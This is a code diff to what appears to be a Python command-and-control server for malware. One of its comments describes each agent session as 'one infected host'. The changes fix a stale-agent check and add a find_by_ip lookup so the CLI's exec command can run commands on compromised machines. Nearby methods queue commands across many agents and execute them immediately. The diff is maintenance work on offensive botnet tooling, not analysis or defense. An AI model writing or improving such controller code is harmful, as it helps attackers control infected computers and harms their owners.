@@ -32,6 +32,9 @@ from typing import Any, Callable, Dict, List, Optional, Tuple
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
 
+# Seconds without a check-in after which an agent is considered stale.
+STALE_THRESHOLD_SECONDS = 600
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 # Agent Session (represents one infected host)
@@ -63,8 +66,14 @@ class AgentSession:
         return time.time() - self.last_seen
 
     @property
-    def is_stale(self, threshold: int = 600) -> bool:
-        return self.idle_seconds > threshold
+    def is_stale(self) -> bool:
+        """True when the agent has not checked in for STALE_THRESHOLD seconds.
+
+        (Was a @property with a `threshold` parameter: accessing
+        agent.is_stale returned the bound method, which is always truthy,
+        so every agent looked stale.)
+        """
+        return self.idle_seconds > STALE_THRESHOLD_SECONDS
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -330,6 +339,22 @@ class AgentController:
                 count += 1
         logger.info(f"Task queued on {count} agents: {command[:50]}")
         return count
+
+    def find_by_ip(self, ip: str) -> Optional[object]:
+        """Return the most recently registered live agent for an IP, or None.
+
+        Agent ids are derived from ip:username, so callers that only know the
+        IP (CLI `exec`) must look the agent up instead of guessing the id.
+        """
+        with self._lock:
+            candidates = [a for a in self._agents.values() if a.ip == ip]
+        if not candidates:
+            return None
+        candidates.sort(key=lambda a: getattr(a, "first_seen", 0), reverse=True)
+        for agent in candidates:
+            if agent.alive:
+                return agent
+        return candidates[0]
 
     def execute_now(self, agent_id: str, command: str, timeout: int = 15) -> Tuple[int, str]:
         """Execute a command immediately on an agent (blocking)."""
